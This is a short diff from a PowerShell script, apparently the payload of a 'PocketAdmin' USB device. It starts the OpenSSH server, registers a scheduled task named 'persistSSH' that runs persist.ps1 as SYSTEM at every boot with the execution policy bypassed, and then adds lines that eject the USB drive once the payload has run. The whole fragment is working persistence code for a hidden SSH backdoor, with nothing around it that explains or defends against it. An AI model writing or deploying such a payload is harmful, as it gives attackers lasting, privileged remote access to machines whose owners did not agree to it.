@@ -50,3 +50,6 @@ Start-Service -Name sshd
 schtasks.exe /Delete  /TN persistSSH /F
 schtasks.exe /Create /RU SYSTEM /SC ONSTART /TN persistSSH /TR " powershell.exe -exec bypass & \""\""\""C:\Program Files\OpenSSH\persist.ps1\""\""\"" "  /RL HIGHEST /F
 schtasks.exe /Run /TN persistSSH
+
+#try to eject the PocketAdmin's usb drive
+(New-Object -comObject Shell.Application).NameSpace(17).ParseName("${drv}:").InvokeVerb("Eject")
